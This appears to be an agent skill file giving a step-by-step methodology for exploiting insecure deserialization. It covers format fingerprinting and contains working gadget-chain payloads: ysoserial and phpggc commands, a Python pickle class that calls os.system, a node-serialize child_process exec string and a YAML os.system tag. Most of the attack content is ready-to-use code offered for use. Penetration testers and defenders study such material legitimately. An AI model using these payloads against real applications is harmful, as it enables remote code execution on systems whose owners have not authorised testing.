---
name: deserialization-methodology
description: "Insecure deserialization: identifying serialized data, fingerprinting the language, and achieving code execution via gadget chains. Use this skill when an application deserializes user-controlled data."
---

# Deserialization

## Overview

Deserialization of untrusted data instantiates objects and runs their magic methods. With a gadget chain, that is RCE.

## Identify the format

| Signature | Language |
|---|---|
| `rO0AB` (base64) / `AC ED 00 05` | Java |
| `O:4:"User":...` | PHP |
| `AAEAAAD/////` (base64) | .NET BinaryFormatter |
| `gASV` (base64 pickle) | Python |
| `{"$type":...}` | .NET JSON.NET |
| `_$$ND_FUNC$$_` | Node `node-serialize` |
| `---\n` YAML | YAML |

```bash
echo "rO0AB..." | base64 -d | xxd | head -2
```

## Java

Tools: `ysoserial`, `ysoserial.net`, `JNDI-Injection-Exploit`.

```bash
java -jar ysoserial.jar CommonsCollections5 "touch /tmp/pwned" | base64 -w0
```

Chain selection depends on libraries on the classpath. Enumerate with `marshalsec` or by fingerprinting the app's dependencies.

Common chains: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1/2`, `Groovy1`, `Hibernate1`, `JRMPClient`.

## PHP

```php
O:8:"stdClass":0:{}
```

Magic methods: `__wakeup`, `__destruct`, `__toString`. Tools: `phpggc` (framework chains: Laravel, Symfony, Monolog, Guzzle).

```bash
phpggc Laravel/RCE1 system id -b
```

## Python pickle

```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ("id",))
print(pickle.dumps(E()).hex())
```

## .NET

```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64
```

## Node

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## YAML

```yaml
!!python/object/apply:os.system ["id"]
```

## Detection without a payload

- Look for `Content-Type: application/x-java-serialized-object`
- Cookies with base64 blobs starting with `rO0`
- ViewState in ASP.NET (machineKey needed)

## Pitfalls

- A payload that errors still reveals the library stack trace — use it to select a chain.
- Class filtering (`ObjectInputFilter`, `allowed_classes`) may block the chain.
- Gadget chains are version-specific.

## Verification

Command output or an out-of-band callback must confirm execution.
